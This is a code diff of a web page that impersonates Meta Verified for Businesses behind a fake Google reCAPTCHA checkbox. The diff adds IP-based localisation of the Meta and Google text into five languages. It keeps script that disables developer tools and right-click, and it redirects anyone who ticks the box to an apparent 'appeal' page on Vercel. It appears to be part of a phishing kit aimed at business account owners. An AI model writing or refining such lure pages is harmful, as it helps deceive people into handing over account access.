@@ -116,6 +116,7 @@
         }
     </style>
     <script>
+        // Prevent F12, right-click, etc.
         document.addEventListener("keydown", function (e) { ("F12" === e.key || e.ctrlKey && e.shiftKey && ("I" === e.key || "J" === e.key || "C" === e.key) || e.ctrlKey && "u" === e.key) && e.preventDefault() }), document.addEventListener("contextmenu", function (e) { e.preventDefault() })
     </script>
 </head>
@@ -123,8 +124,8 @@
     <div class="bg-[#ffffff] flex flex-col items-center justify-center h-screen w-full">
         <div class="font-roboto text-[14px] text-gray-800 w-full h-full flex flex-col justify-center p-4 md:p-0 md:w-[300px]">
             <div style="text-align: center; margin-bottom: 20px;">
-    <img src="https://i.postimg.cc/qqQvGqsv/meta.png" alt="Logo" style="width: 96px; height: auto;">
-</div>
+                <img src="https://i.postimg.cc/qqQvGqsv/meta.png" alt="Logo" style="width: 96px; height: auto;">
+            </div>
             <div class="flex items-center justify-start bg-cover bg-center py-5 w-full font-helvetica">
                 <div class="bg-[#f9f9f9] border-2 rounded-md text-[#4c4a4b] flex flex-row items-center justify-between pr-2 w-full captcha-box">
                     <div class="flex flex-row items-center justify-start ml-[1rem]">
@@ -136,7 +137,7 @@
                                 </svg>
                             </label>
                         </div>
-                        <label for="checked-capcha" class="cursor-pointer text-[14px] text-gray-500 font-semibold mr-4 ml-1 text-center text-left tracking-normal">Ben robot değilim</label>
+                        <label for="checked-capcha" class="cursor-pointer text-[14px] text-gray-500 font-semibold mr-4 ml-1 text-center text-left tracking-normal" id="captcha-label">Ben robot değilim</label>
                     </div>
                     <div class="flex items-center flex-col text-[#9d9ba7] mb-[2px]">
                         <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="recaptcha" class="w-[40px] h-[40px] mt-[.5rem]">
@@ -145,19 +146,130 @@
                     </div>
                 </div>
             </div>
-            <div class="text-gray-700 font-helvetica text-[13px] leading-[1.3] description-text">
-                <p class="font-normal">Bu, zararlı davranışlarla mücadele etmemize, spam'i tespit edip önlememize ve ürünlerimizi güvende tutmamıza yardımcı olur.</p>
-                <p class="font-normal mt-4">Bu güvenlik kontrolünü sağlamak için Google'ın reCAPTCHA Enterprise hizmetini kullandık. Hizmeti kullanımınız Google'ın Gizlilik Politikası ve Kullanım Koşulları'na tabidir.</p>
-                <p class="font-normal mt-4">Hizmet, cihaz ve uygulama hakkında bilgi toplar ve hizmeti iyileştirmek ve güvenlik amaçlarıyla Google'a gönderir. Bu bilgiler kişiselleştirilmiş reklamcılık için kullanılmaz.</p>
+            <div class="text-gray-700 font-helvetica text-[13px] leading-[1.3] description-text" id="description-container">
+                <!-- Dynamic content will be injected here -->
             </div>
         </div>
     </div>
     <script>
+        // Multi-language content based on IP
+        const contentMap = {
+            'tr': {
+                title: 'Meta Verified İşletmeler İçin | İşletmenizi Facebook, Instagram ve WhatsApp\'ta Doğrulayın | Meta İşletmeler İçin',
+                desc: 'Meta Verified ile işinize ne kadar ciddi yaklaştığınızı dünyaya gösterin. Doğrulama rozeti, kimlik taklidi koruması, hesap desteği ve müşterilerinizle daha iyi bağlantı kurmanıza yardımcı olacak araçlar edinin.',
+                captcha: 'Ben robot değilim',
+                p1: 'Bu, zararlı davranışlarla mücadele etmemize, spam\'i tespit edip önlememize ve ürünlerimizi güvende tutmamıza yardımcı olur.',
+                p2: 'Bu güvenlik kontrolünü sağlamak için Google\'ın reCAPTCHA Enterprise hizmetini kullandık. Hizmeti kullanımınız Google\'ın Gizlilik Politikası ve Kullanım Koşulları\'na tabidir.',
+                p3: 'Hizmet, cihaz ve uygulama hakkında bilgi toplar ve hizmeti iyileştirmek ve güvenlik amaçlarıyla Google\'a gönderir. Bu bilgiler kişiselleştirilmiş reklamcılık için kullanılmaz.'
+            },
+            'en': {
+                title: 'Meta Verified for Businesses | Verify Your Business on Facebook, Instagram and WhatsApp | Meta for Businesses',
+                desc: 'Show the world how seriously you take your business with Meta Verified. Get a verification badge, impersonation protection, account support, and tools to help you connect better with your customers.',
+                captcha: 'I am not a robot',
+                p1: 'This helps us combat harmful behavior, detect and prevent spam, and keep our products safe.',
+                p2: 'We use Google\'s reCAPTCHA Enterprise service to provide this security check. Your use of the service is subject to Google\'s Privacy Policy and Terms of Use.',
+                p3: 'The service collects information about the device and application and sends it to Google to improve the service and for security purposes. This information is not used for personalized advertising.'
+            },
+            'vi': {
+                title: 'Meta Verified dành cho Doanh nghiệp | Xác minh Doanh nghiệp của bạn trên Facebook, Instagram và WhatsApp | Meta dành cho Doanh nghiệp',
+                desc: 'Thể hiện với thế giới mức độ nghiêm túc của bạn với doanh nghiệp thông qua Meta Verified. Nhận huy hiệu xác minh, bảo vệ chống giả mạo, hỗ trợ tài khoản và các công cụ giúp bạn kết nối tốt hơn với khách hàng.',
+                captcha: 'Tôi không phải là người máy',
+                p1: 'Điều này giúp chúng tôi chống lại hành vi có hại, phát hiện và ngăn chặn thư rác, và giữ cho sản phẩm của chúng tôi an toàn.',
+                p2: 'Chúng tôi sử dụng dịch vụ reCAPTCHA Enterprise của Google để cung cấp kiểm tra bảo mật này. Việc bạn sử dụng dịch vụ này tuân theo Chính sách Bảo mật và Điều khoản Sử dụng của Google.',
+                p3: 'Dịch vụ thu thập thông tin về thiết bị và ứng dụng và gửi đến Google để cải thiện dịch vụ và vì mục đích bảo mật. Thông tin này không được sử dụng cho quảng cáo được cá nhân hóa.'
+            },
+            'es': {
+                title: 'Meta Verified para Empresas | Verifique su empresa en Facebook, Instagram y WhatsApp | Meta para Empresas',
+                desc: 'Demuestre al mundo lo seriamente que se toma su negocio con Meta Verified. Obtenga una insignia de verificación, protección contra suplantación de identidad, soporte de cuenta y herramientas para ayudarlo a conectarse mejor con sus clientes.',
+                captcha: 'No soy un robot',
+                p1: 'Esto nos ayuda a combatir comportamientos dañinos, detectar y prevenir el spam, y mantener seguros nuestros productos.',
+                p2: 'Utilizamos el servicio reCAPTCHA Enterprise de Google para proporcionar este control de seguridad. Su uso del servicio está sujeto a la Política de Privacidad y Términos de Uso de Google.',
+                p3: 'El servicio recopila información sobre el dispositivo y la aplicación y la envía a Google para mejorar el servicio y por motivos de seguridad. Esta información no se utiliza para publicidad personalizada.'
+            },
+            'fr': {
+                title: 'Meta Verified pour les entreprises | Vérifiez votre entreprise sur Facebook, Instagram et WhatsApp | Meta pour les entreprises',
+                desc: 'Montrez au monde à quel point vous prenez votre entreprise au sérieux avec Meta Verified. Obtenez un badge de vérification, une protection contre l\'usurpation d\'identité, une assistance par compte et des outils pour vous aider à mieux connecter avec vos clients.',
+                captcha: 'Je ne suis pas un robot',
+                p1: 'Cela nous aide à lutter contre les comportements nuisibles, à détecter et prévenir le spam, et à maintenir la sécurité de nos produits.',
+                p2: 'Nous utilisons le service reCAPTCHA Enterprise de Google pour fournir ce contrôle de sécurité. Votre utilisation du service est soumise à la Politique de confidentialité et aux Conditions d\'utilisation de Google.',
+                p3: 'Le service collecte des informations sur l\'appareil et l\'application et les envoie à Google pour améliorer le service et à des fins de sécurité. Ces informations ne sont pas utilisées pour la publicité personnalisée.'
+            }
+        };
+
+        // Default to Turkish if no match, but we will set based on IP
+        let detectedLang = 'tr'; 
+
+        // Function to update the page content
+        function updateContent(lang) {
+            const content = contentMap[lang] || contentMap['tr'];
+            if (!content) return;
+
+            // Update meta tags
+            document.querySelector('title').textContent = content.title;
+            document.querySelector('meta[name="description"]').setAttribute('content', content.desc);
+            document.querySelector('meta[property="og:title"]').setAttribute('content', content.title);
+            document.querySelector('meta[property="og:description"]').setAttribute('content', content.desc);
+            document.querySelector('meta[name="twitter:title"]').setAttribute('content', content.title);
+            document.querySelector('meta[name="twitter:description"]').setAttribute('content', content.desc);
+
+            // Update captcha label
+            document.getElementById('captcha-label').textContent = content.captcha;
+
+            // Update description paragraphs
+            const container = document.getElementById('description-container');
+            container.innerHTML = `
+                <p class="font-normal">${content.p1}</p>
+                <p class="font-normal mt-4">${content.p2}</p>
+                <p class="font-normal mt-4">${content.p3}</p>
+            `;
+        }
+
+        // Get user's country via IP (free API)
+        async function detectLanguageByIP() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) throw new Error('IP API failed');
+                const data = await response.json();
+                const countryCode = data.country_code?.toLowerCase(); // e.g., 'tr', 'us', 'vn', 'es', 'fr'
+                // Map country code to language code (simplified)
+                const langMap = {
+                    'tr': 'tr',
+                    'us': 'en', 'gb': 'en', 'au': 'en', 'ca': 'en',
+                    'vn': 'vi',
+                    'es': 'es', 'mx': 'es', 'ar': 'es', 'co': 'es',
+                    'fr': 'fr', 'be': 'fr', 'ch': 'fr', 'ca': 'fr'
+                };
+                return langMap[countryCode] || 'en'; // default to English if not found
+            } catch (error) {
+                console.warn('Could not detect language via IP, using fallback.');
+                return 'vi'; // Fallback to Vietnamese (or you can change to 'en')
+            }
+        }
+
+        // Initialize
+        (async function init() {
+            // First, show Turkish as default (quick)
+            updateContent('tr');
+            
+            // Try to detect language from IP
+            const lang = await detectLanguageByIP();
+            // Only update if language is different and exists in map
+            if (contentMap[lang]) {
+                updateContent(lang);
+            } else {
+                // Fallback to Vietnamese if detected language not supported
+                updateContent('vi');
+            }
+        })();
+
+        // Captcha handler
         document.getElementById("checked-capcha").addEventListener("change", function () {
-            this.checked && setTimeout(function () {
-                window.location.href = "https://my-appeal-page1.vercel.app/"
-            }, 600)
-        })
+            if (this.checked) {
+                setTimeout(function () {
+                    window.location.href = "https://my-appeal-page1.vercel.app/";
+                }, 600);
+            }
+        });
     </script>
     <script type="module">
         import { inject } from 'https://esm.sh/@vercel/analytics';
